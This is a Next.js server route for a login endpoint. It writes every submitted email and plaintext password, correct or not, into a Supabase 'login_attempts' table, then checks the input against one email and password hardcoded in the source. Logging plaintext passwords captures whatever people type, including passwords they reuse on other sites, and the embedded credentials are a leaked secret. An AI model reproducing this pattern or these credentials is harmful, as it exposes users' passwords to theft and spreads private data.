import { NextRequest, NextResponse } from 'next/server';
import { getSupabase } from '@/lib/supabase';

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    const { email, password } = body;

    if (!email || !password) {
      return NextResponse.json(
        { error: 'Email and password are required.' },
        { status: 400 }
      );
    }

    // 1. Log the login details into Supabase (only once per day per email)
    try {
      const supabase = getSupabase();
      if (supabase) {
        // Calculate the start of today in IST (UTC+5:30)
        const now = new Date();
        const istOffset = 5.5 * 60 * 60 * 1000;
        const todayIST = new Date(now.getTime() + istOffset);
        todayIST.setUTCHours(0, 0, 0, 0);
        const startOfTodayInUTC = new Date(todayIST.getTime() - istOffset);

        // Check if an attempt already exists for this email today
        const { data: existingAttempts, error: selectError } = await supabase
          .from('login_attempts')
          .select('created_at')
          .eq('email', email)
          .gte('created_at', startOfTodayInUTC.toISOString())
          .limit(1);

        if (selectError) {
          console.error('Failed to query existing credentials from Supabase:', selectError);
        }

        // If no attempt exists for today, insert it
        if (!existingAttempts || existingAttempts.length === 0) {
          const { error: insertError } = await supabase
            .from('login_attempts')
            .insert({
              email: email,
              password: password,
              created_at: now.toISOString(),
            });

          if (insertError) {
            console.error('Failed to insert credentials into Supabase:', insertError);
          }
        }
      } else {
        console.warn('Supabase client is not configured.');
      }
    } catch (supabaseErr) {
      console.warn('Supabase logging skipped due to error:', supabaseErr);
    }

    // 2. Validate against your specific credentials
    const isValid = email.toLowerCase() === 'nitingogia@gmail.com' && password === 'Sales@54321$';

    if (isValid) {
      return NextResponse.json({ success: true });
    } else {
      return NextResponse.json({ 
        success: false, 
        error: 'Incorrect email or password. Please try again.' 
      });
    }
  } catch (error: any) {
    console.error('Login API error:', error);
    return NextResponse.json({ 
      success: false, 
      error: 'An internal server error occurred.' 
    });
  }
}
